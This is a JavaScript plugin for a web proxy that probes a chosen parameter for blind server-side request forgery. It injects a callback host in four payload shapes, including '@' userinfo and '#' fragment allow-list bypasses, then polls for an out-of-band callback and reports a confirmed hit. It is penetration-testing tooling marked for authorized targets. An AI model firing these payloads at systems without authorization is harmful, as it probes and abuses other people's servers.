/*!
 * SSRF Cannon — Beacon-armed blind-SSRF prover.
 *
 * Mints an OAST (Beacon) payload, fires it into a chosen parameter of a captured request
 * across several SSRF bypass shapes, then polls Beacon for the callback and auto-promotes a
 * confirmed hit to a finding — correlating which payload shape fired it. Collaborator plus
 * manual correlation, composed into one run and drivable from an agent.
 *
 * Hunter Pro (Beacon hits + findings). Active out-of-band probing — AUTHORIZED TARGETS ONLY.
 * Crusader community plugin · MIT · https://crusaderproxy.com/ext/ssrf-cannon.js
 */
"use strict";

function setParam(url, key, value) {
  try {
    var hash = "", h = url.indexOf("#");
    if (h >= 0) { hash = url.slice(h); url = url.slice(0, h); }
    var qi = url.indexOf("?");
    var path = qi >= 0 ? url.slice(0, qi) : url;
    var qs = qi >= 0 ? url.slice(qi + 1) : "";
    var parts = qs ? qs.split("&") : [];
    var enc = encodeURIComponent(value), found = false;
    for (var i = 0; i < parts.length; i++) {
      var eq = parts[i].indexOf("=");
      var k = eq >= 0 ? parts[i].slice(0, eq) : parts[i];
      if (decodeURIComponent(k) === key) { parts[i] = k + "=" + enc; found = true; }
    }
    if (!found) parts.push(encodeURIComponent(key) + "=" + enc);
    return path + "?" + parts.join("&") + hash;
  } catch (e) { return url; }
}

crusader.extension({
  id: "ssrf-cannon",
  name: "SSRF Cannon",
  version: "1.0.0",
  description: "Fire OAST-armed SSRF payloads into a parameter and auto-prove blind SSRF from the callback.",
  permissions: ["history", "network", "beacon", "findings"],
  capabilities: ["history", "network", "beacon", "scanner.findings"],
  inputs: [
    { id: "history_id", type: "text", label: "History id of the request", required: true },
    { id: "param", type: "text", label: "Parameter to inject (query key)", required: true, placeholder: "url" },
    { id: "wait", type: "text", label: "Seconds to wait for callbacks (5–45)", default: "20" }
  ],
  run: function (state, api) {
    var hid = parseInt((state.history_id || "").trim(), 10);
    var param = (state.param || "").trim();
    var wait = Math.max(5, Math.min(45, parseInt(state.wait || "20", 10) || 20));
    if (!hid || !param) { api.ui({ t: "note", level: "error", text: "Need a numeric history_id and a param name." }); return; }
    api.ui({ t: "note", level: "warn", text: "Active SSRF probing — authorized targets only." });

    var base = api.historyGet(hid);
    if (!base || !base.url) { api.ui({ t: "note", level: "error", text: "No history row " + hid + "." }); return; }

    var tag = "ssrf-cannon-" + hid;
    var beacon = api.beacon({ action: "create", module: "ssrf", tag: tag, historyId: hid });
    if (!beacon || beacon.ok === false || !beacon.host) {
      api.ui({ t: "note", level: "error", text: "Beacon not ready: " + ((beacon && beacon.error) || "configure Beacon first — Custom/BYO works on Free.") });
      return;
    }
    var host = beacon.host;
    var shapes = [
      { name: "direct http", value: "http://" + host + "/" },
      { name: "https", value: "https://" + host + "/" },
      { name: "userinfo @ trick", value: "http://expected.example@" + host + "/" },
      { name: "fragment # trick", value: "http://" + host + "#@expected.example/" }
    ];

    api.ui({ t: "summary", title: "SSRF Cannon", subtitle: (base.method || "GET") + " " + base.url + "  ·  param=" + param, stats: [
      { label: "callback", value: host }, { label: "shapes", value: String(shapes.length) }, { label: "wait", value: wait + "s" }
    ] });

    for (var s = 0; s < shapes.length; s++) {
      if (api.cancelled()) break;
      var u = setParam(base.url, param, shapes[s].value);
      api.status("Firing: " + shapes[s].name);
      var res = api.request({ method: base.method || "GET", url: u, source: "ssrf-cannon" });
      api.output(shapes[s].name + " → HTTP " + (res.status === 0 ? (res.statusText || "blocked") : res.status));
    }

    api.status("Waiting up to " + wait + "s for callbacks…");
    var slept = 0, hits = [];
    while (slept < wait && !api.cancelled()) {
      api.sleep(2000); slept += 2;
      hits = api.beacon({ action: "hits", slug: beacon.slug, tag: tag, limit: 50 }) || [];
      if (hits.length) break;
      api.progress({ message: "polling beacon", current: slept, total: wait });
    }

    if (!hits.length) {
      api.ui({ t: "note", level: "ok", text: "No callback in " + wait + "s. Not proof of safety — try another param, a longer wait via `crusader beacon wait`, or a Beacon host on the target's egress path." });
      return;
    }

    var httpHits = [];
    for (var i = 0; i < hits.length; i++) { if (/http/i.test(hits[i].protocol || "")) httpHits.push(hits[i]); }
    var lead = httpHits.length ? httpHits[0] : hits[0];

    api.report({
      severity: httpHits.length ? "high" : "info",
      title: httpHits.length ? "Blind SSRF confirmed via Beacon callback" : "OAST callback received (DNS-only — weak signal)",
      detail: "Injecting param '" + param + "' on " + (base.method || "GET") + " " + base.url + " produced " + hits.length +
              " out-of-band callback(s) to " + host + " (" + (lead.protocol || "?") + " from " + (lead.source_ip || "?") + "). " +
              (httpHits.length ? "An HTTP callback proves the server fetched the payload URL." : "DNS-only proves resolution, not a fetch — confirm with an HTTP hit before reporting."),
      url: base.url, historyId: hid
    });
    var items = [];
    for (var j = 0; j < hits.length && j < 8; j++) {
      items.push({ severity: /http/i.test(hits[j].protocol || "") ? "high" : "info", title: (hits[j].protocol || "?") + " from " + (hits[j].source_ip || "?"), url: host, detail: hits[j].received_at });
    }
    api.ui({ t: "findings", subtitle: "Beacon callbacks", items: items });
  }
});
